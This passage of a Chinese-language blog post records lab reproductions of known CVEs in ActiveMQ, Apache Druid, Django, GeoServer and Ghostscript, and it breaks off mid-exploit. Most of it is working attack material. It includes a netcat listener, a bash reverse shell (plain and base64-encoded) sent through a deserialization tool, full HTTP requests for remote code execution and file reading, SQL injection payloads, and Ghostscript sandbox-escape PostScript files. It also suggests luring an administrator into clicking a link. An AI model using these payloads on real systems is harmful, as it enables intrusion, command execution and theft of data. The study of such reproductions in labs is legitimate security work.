<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 19999</span><br></pre></td></tr></table></div></figure>

<p>bash反弹命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.88.130/19999 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>

<p>所以执行命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; /dev/tcp/192.168.239.128/19999 0&gt;&amp;1&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></div></figure>

<p>但是没成功，需要将反弹命令进行base64编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241648070.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjEzMC8xOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></div></figure>

<p>再次点击消息以执行命令</p>
<p>成功连接到shell</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241649371.png" alt="image-20240624164908325"></p>
<p>ps：点击消息并触发漏洞这个过程需要管理员权限，复现之所以成功是因为登录时就是使用的管理员账号，在没有密码的情况下，可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>

        <h2 id="CVE-2022-41678"   >
          <a href="#CVE-2022-41678" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2022-41678" class="headerlink" title="CVE-2022-41678"></a>CVE-2022-41678</h2>
      <p>Apache ActiveMQ 在5.16.5, 5.17.3版本及以前，后台Jolokia存在一处任意文件写入导致的远程代码执行漏洞。</p>
<p>docker启动后访问<code>http://your-ip:8161</code>，然后输入账号密码admin/admin，登录后台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251038092.png" alt="image-20240625103815968"></p>
<p>登录之后抓包</p>
<p>访问接口<code>/api/jolokia/list</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251104222.png" alt="image-20240625110457176"></p>
<p>Origin为空，那么添加Origin值为<code>http://your-ip:8161</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /api/jolokia/list HTTP/1.1</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Origin:http://your-ip:8161</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251104910.png" alt="image-20240625110434790"></p>
<p>“org.apache.logging.log4j2”:{“component=Loggers,name=org.apache.xbean,type=6ddf90b0”</p>
<p>访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/jolokia/ HTTP/1.1</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Origin: http://your-ip:8161</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 131</span><br><span class="line">&#123;&quot;type&quot;: &quot;exec&quot;, &quot;mbean&quot;: &quot;org.apache.logging.log4j2:type=6ddf90b0&quot;, &quot;operation&quot;: &quot;setConfigText&quot;, &quot;arguments&quot;: [&quot;xml&quot;, &quot;utf-8&quot;]&#125;</span><br></pre></td></tr></table></div></figure>

<p>状态为200，可以证明漏洞存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251120064.png" alt="image-20240625112034008"></p>
<p>进行注入</p>

        <h1 id="Adminer"   >
          <a href="#Adminer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Adminer" class="headerlink" title="Adminer"></a>Adminer</h1>
      
        <h2 id="CVE-2021-21311"   >
          <a href="#CVE-2021-21311" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2021-21311" class="headerlink" title="CVE-2021-21311"></a>CVE-2021-21311</h2>
      
        <h1 id="apache-druid"   >
          <a href="#apache-druid" class="heading-link"><i class="fas fa-link"></i></a><a href="#apache-druid" class="headerlink" title="apache-druid"></a>apache-druid</h1>
      
        <h2 id="CVE-2021-25646"   >
          <a href="#CVE-2021-25646" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2021-25646" class="headerlink" title="CVE-2021-25646"></a>CVE-2021-25646</h2>
      <p>Apache Druid包括执行嵌入在各种类型请求中的用户提供的JavaScript代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在Druid 0.20.0及以前的版本中，攻击者可以通过发送一个恶意请求使Druid用内置引擎执行任意JavaScript代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271517616.png" alt="image-20240627151736455"></p>
<p>抓包，将数据包修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler HTTP/1.1</span><br><span class="line">Host: your-ip:8888</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: adminer_version=4.8.1; adminer_permanent=</span><br><span class="line">If-Modified-Since: Thu, 08 Oct 2020 21:58:58 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 912</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;:&quot;index&quot;,</span><br><span class="line">    &quot;spec&quot;:&#123;</span><br><span class="line">        &quot;ioConfig&quot;:&#123;</span><br><span class="line">            &quot;type&quot;:&quot;index&quot;,</span><br><span class="line">            &quot;firehose&quot;:&#123;</span><br><span class="line">                &quot;type&quot;:&quot;local&quot;,</span><br><span class="line">                &quot;baseDir&quot;:&quot;/etc&quot;,</span><br><span class="line">                &quot;filter&quot;:&quot;passwd&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;dataSchema&quot;:&#123;</span><br><span class="line">            &quot;dataSource&quot;:&quot;test&quot;,</span><br><span class="line">            &quot;parser&quot;:&#123;</span><br><span class="line">                &quot;parseSpec&quot;:&#123;</span><br><span class="line">                &quot;format&quot;:&quot;javascript&quot;,</span><br><span class="line">                &quot;timestampSpec&quot;:&#123;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;dimensionsSpec&quot;:&#123;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;function&quot;:&quot;function()&#123;var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\&quot;sh\&quot;,\&quot;-c\&quot;,\&quot;id\&quot;]).getInputStream()).useDelimiter(\&quot;\\A\&quot;).next();return &#123;timestamp:123123,test: a&#125;&#125;&quot;,</span><br><span class="line">                &quot;&quot;:&#123;</span><br><span class="line">                    &quot;enabled&quot;:&quot;true&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;samplerConfig&quot;:&#123;</span><br><span class="line">        &quot;numRows&quot;:10</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271519833.png" alt="image-20240627151914774"></p>
<p>证明漏洞存在</p>

        <h1 id="django"   >
          <a href="#django" class="heading-link"><i class="fas fa-link"></i></a><a href="#django" class="headerlink" title="django"></a>django</h1>
      
        <h2 id="Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）"   >
          <a href="#Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）" class="headerlink" title="Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）"></a>Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）</h2>
      <p>在数据库函数<code>Trunc()</code>和<code>Extract()</code>中存在SQL注入漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407040945677.png" alt="image-20240704094545597"></p>
<p>这是我访问两次后的界面</p>
<p>这个页面使用了Trunc函数来聚合页面点击数量</p>
<p>传入<code>date</code>参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?date=1&#x27;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041007672.png" alt="image-20240704100733615"></p>
<p>说明存在SQL漏洞</p>

        <h2 id="Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）"   >
          <a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="headerlink" title="Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）"></a>Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041310261.png" alt="image-20240704131058145"></p>
<p>访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vuln</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041311171.png" alt="image-20240704131156126"></p>
<p>当<code>order_by</code>的传入参数中包含<code>.</code>时，可进行SQL注入，但需要正确的列名，可以通过猜测<code>id, _id</code>或输入错误的列名，从报错信息中得到列名</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041329422.png" alt="image-20240704132944373"></p>
<p>构造参数<code>order=-id</code>，会得到根据id降序排列的结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041313235.png" alt="image-20240704131305202"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vuln/?order=.id);select updatexml(1,concat(&#x27;:&#x27;,&#x27;aaaa&#x27;),1)%23 //#号不行，或者换成--+来注释也可以</span><br></pre></td></tr></table></div></figure>

<p><code>updatexml(1, ...)</code>：<code>updatexml</code> 是一个 XML 处理函数，传递非法参数会引发错误。</p>
<p><code>concat(&#39;:&#39;, &#39;aaaa&#39;)</code>：<code>concat</code> 函数用于连接字符串，在这里它将 <code>:</code> 和 <code>aaaa</code> 连接起来。</p>
<p><code>1</code>：传递的第三个参数不合法，从而触发错误。</p>
<p>成功输出<code>:aaaa</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041316012.png" alt="image-20240704131651940"></p>
<p>证明漏洞存在</p>
<p>慢慢注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.id);select updatexml(1,concat(&#x27;:&#x27;,(select database())),1)%23 //得到数据库名cve</span><br></pre></td></tr></table></div></figure>

<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/R3col/p/16094132.html" >https://www.cnblogs.com/R3col/p/16094132.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"   >
          <a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</h2>
      <p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041343715.png" alt="image-20240704134348615"></p>
<p>首先登陆后台</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8000/admin/</span><br></pre></td></tr></table></div></figure>

<p>用户名密码为<code>admin</code>、<code>a123123123</code></p>
<p>登录后点击<code>Collection</code>，进入模型<code>Collection</code>的管理页面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041345637.png" alt="image-20240704134555591"></p>

        <h1 id="geoserver"   >
          <a href="#geoserver" class="heading-link"><i class="fas fa-link"></i></a><a href="#geoserver" class="headerlink" title="geoserver"></a>geoserver</h1>
      
        <h2 id="GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）"   >
          <a href="#GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="heading-link"><i class="fas fa-link"></i></a><a href="#GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）</h2>
      <p>GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031333548.png" alt="image-20240703133343446"></p>
<p>点击<code>/geoserver</code>链接并抓包</p>
<p>使用<code>GetPropertyValue</code>来执行xpath表达式。构造了两个POC：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#x27;touch%20/tmp/test1&#x27;) HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /geoserver/wfs HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Content-Type: application/xml</span><br><span class="line"></span><br><span class="line">&lt;wfs:GetPropertyValue service=&#x27;WFS&#x27; version=&#x27;2.0.0&#x27;</span><br><span class="line"> xmlns:topp=&#x27;http://www.openplans.org/topp&#x27;</span><br><span class="line"> xmlns:fes=&#x27;http://www.opengis.net/fes/2.0&#x27;</span><br><span class="line"> xmlns:wfs=&#x27;http://www.opengis.net/wfs/2.0&#x27;&gt;</span><br><span class="line">  &lt;wfs:Query typeNames=&#x27;sf:archsites&#x27;/&gt;</span><br><span class="line">  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#x27;touch /tmp/test2&#x27;)&lt;/wfs:valueReference&gt;</span><br><span class="line">&lt;/wfs:GetPropertyValue&gt;</span><br></pre></td></tr></table></div></figure>

<p>都是执行<code>touch /tmp/test</code>命令，查看容器内文档即可验证</p>
<p>（本来想试试将<code>id</code>命令写入某个文档，但是命令不成功，可能是因为<code>&gt;</code>与前面的符合产生了闭合，所以无法执行）</p>

        <h1 id="Ghostscript"   >
          <a href="#Ghostscript" class="heading-link"><i class="fas fa-link"></i></a><a href="#Ghostscript" class="headerlink" title="Ghostscript"></a>Ghostscript</h1>
      
        <h2 id="GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509"   >
          <a href="#GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509" class="heading-link"><i class="fas fa-link"></i></a><a href="#GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509"></a>GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509</h2>
      <p>GhostScript的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021430509.png" alt="image-20240702143020478"></p>
<p>是一个上传文件的界面</p>
<p>上传了yaml等格式的文件都提示<code>Unsupported filetype uploaded</code>，但是上传图片文件则会返回<code>Image size is:</code>，所以只能上次图片文件来绕过文件类型的检测</p>
<p>由于 GhostScript 是一个解释 PostScript 和 PDF 文件的程序，这个漏洞主要利用了 GhostScript 在处理这些文件时的缺陷，因此通常需要上传包含恶意代码的 PostScript 或 PDF 文件。</p>
<p>上传提供的POC.png文件，文件内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></div></figure>

<p><code>%!PS</code>：这是 PostScript 文件的开头标记</p>
<p><code>userdict /setpagedevice undef</code>：删除 <code>setpagedevice</code> 操作符，这是为了防止页面设备的默认设置被更改</p>
<p><code>save</code> 和 <code>restore</code>：这些操作用于保存和恢复PostScript的当前状态，确保任何更改不会影响后续代码</p>
<p><code>legal</code>：尝试设置页面格式为 legal 大小</p>
<p><code>&#123; null restore &#125; stopped &#123; pop &#125; if</code> 和 <code>&#123; legal &#125; stopped &#123; pop &#125; if</code>：这些操作用于捕获错误并确保如果发生错误，程序可以继续执行。</p>
<p><code>mark /OutputFile (%pipe%id) currentdevice putdeviceprops</code>：这一行试图设置输出文件路径为管道命令 <code>%pipe%id</code>，<code>%pipe%</code>后面的内容被解释为一个命令，而不是一个文件路径。</p>
<p>上传文件后即可看见命令成功执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021501909.png" alt="image-20240702150108881"></p>

        <h2 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）"   >
          <a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="heading-link"><i class="fas fa-link"></i></a><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h2>
      <p>和CVE-2018-16509类似</p>
<p>文件内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">0 1 300367 &#123;&#125; for</span><br><span class="line">&#123;save restore&#125; stopped &#123;&#125; if</span><br><span class="line">(%pipe%id) (w) file</span><br></pre></td></tr></table></div></figure>

<p><code>0 1 300367 &#123;&#125; for</code>:这是一个循环命令，<code>0 1 300367</code> 定义了循环的范围，从 0 到 300367，每次递增 1。<code>&#123;&#125;</code> 是一个空的代码块，在每次循环迭代时执行。在这种情况下，它没有实际的作用，可能是为了防止 PostScript 解释器因空指令而出错。</p>
<p><code>&#123;save restore&#125; stopped &#123;&#125; if</code>:这是一个错误处理块。<code>save restore</code> 是 PostScript 中用于保存和恢复图形状态的命令。<code>stopped</code> 是一个操作符，用于捕获可能的错误。如果 <code>save restore</code> 命令失败，将停止并执行 <code>&#123;&#125; if</code> 后面的空代码块。这种结构用于确保如果 <code>save restore</code> 失败，代码能够继续执行而不崩溃。</p>
<p><code>(%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) (w) file</code>:<code>(w)</code> 表示文件的写模式。<code>file</code> 是一个 PostScript 操作符，用于打开文件并将内容写入文件。</p>

        <h2 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"   >
          <a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="heading-link"><i class="fas fa-link"></i></a><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h2>
      <p>该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span><br><span class="line">/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def</span><br><span class="line"></span><br><span class="line">/exploit &#123;</span><br><span class="line">    (Stage 11: Exploitation...)=</span><br><span class="line"></span><br><span class="line">    /forceput exch def</span><br><span class="line"></span><br><span class="line">    systemdict /SAFER false forceput</span><br><span class="line">    userparams /LockFilePermissions false forceput</span><br><span class="line">    systemdict /userparams get /PermitFileControl [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileWriting [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileReading [(*)] forceput</span><br><span class="line"></span><br><span class="line">    % update</span><br><span class="line">    save restore</span><br><span class="line"></span><br><span class="line">    % All done.</span><br><span class="line">    stop</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">errordict /typecheck &#123;</span><br><span class="line">    /typecount typecount 1 add def</span><br><span class="line">    (Stage 10: /typecheck #)=only typecount ==</span><br><span class="line"></span><br><span class="line">    % The first error will be the .knownget, which we handle and setup the</span><br><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span><br><span class="line">    % dump the operands.</span><br><span class="line">    typecount 1 eq &#123; null &#125; if</span><br><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span><br><span class="line">    typecount 3 eq &#123; (unexpected)= quit &#125;  if</span><br><span class="line">&#125; put</span><br><span class="line"></span><br><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span><br><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span><br><span class="line">% marked as executeonly or pseudo-operators.</span><br><span class="line">%</span><br><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span><br><span class="line">% fail because when the routine was declared, it used `bind` but many of the</span><br><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span><br><span class="line">%</span><br><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span><br><span class="line">% works.</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /typecount      0</span><br><span class="line">    /PDFfile        &#123; (Stage 0: PDFfile)= currentfile &#125;</span><br><span class="line">    /q              &#123; (Stage 1: q)= &#125; % no-op</span><br><span class="line">    /oget           &#123; (Stage 3: oget)= pop pop 0 &#125; % clear stack</span><br><span class="line">    /pdfemptycount  &#123; (Stage 4: pdfemptycount)= &#125; % no-op</span><br><span class="line">    /gput           &#123; (Stage 5: gput)= &#125;  % no-op</span><br><span class="line">    /resolvestream  &#123; (Stage 6: resolvestream)= &#125; % no-op</span><br><span class="line">    /pdfopdict      &#123; (Stage 7: pdfopdict)= &#125; % no-op</span><br><span class="line">    /.pdfruncontext &#123; (Stage 8: .pdfruncontext)= 0 1 mark &#125; % satisfy counttomark and index</span><br><span class="line">    /pdfdict        &#123; (Stage 9: pdfdict)=</span><br><span class="line">        % cause a /typecheck error we handle above</span><br><span class="line">        true</span><br><span class="line">    &#125;</span><br><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span><br><span class="line"></span><br><span class="line">(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=</span><br><span class="line"></span><br><span class="line">% Demonstrate reading a file we 